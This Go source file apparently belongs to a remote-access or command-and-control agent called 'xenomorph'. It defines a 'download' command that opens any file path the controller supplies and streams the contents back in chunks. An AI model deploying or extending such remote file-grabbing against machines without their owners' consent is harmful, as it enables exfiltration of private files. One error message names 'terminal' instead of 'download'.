package command

import (
	"os"

	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"go.uber.org/zap"
)

func initDownloadCommand() {
	err := commandHandler.AddCommand("download", func(client types.ClientController, msgID uint32, command types.Command) {
		filePath := command.Args[0]

		file, err := os.Open(filePath)
		if err != nil {
			logger.L().Error("Failed to open file", zap.Error(err))
			return
		}
		defer file.Close()

		fi, _ := file.Stat()

		metadata := types.FileMetadata{
			ID:    msgID,
			Name:  fi.Name(),
			Size:  fi.Size(),
			Direction: "upload",
		}

		client.Send(types.MsgFileStart, 0, msgID, []byte(metadata.ToJSON()))

		buf := make([]byte, 4096)
		for {
			n, err := file.Read(buf)
			if n > 0 {
				client.Send(types.MsgFileChunk, 0, msgID, buf[:n])
			}

			if err != nil {
				break
			}
		}

		fileEndMsg := types.FileEnd{
			ID: msgID,
		}

		client.Send(types.MsgFileEnd, 0, msgID, []byte(fileEndMsg.ToJSON()))
	})

	if err != nil {
		logger.L().Error("Failed to register 'terminal' command handler", zap.Error(err))
	}
}
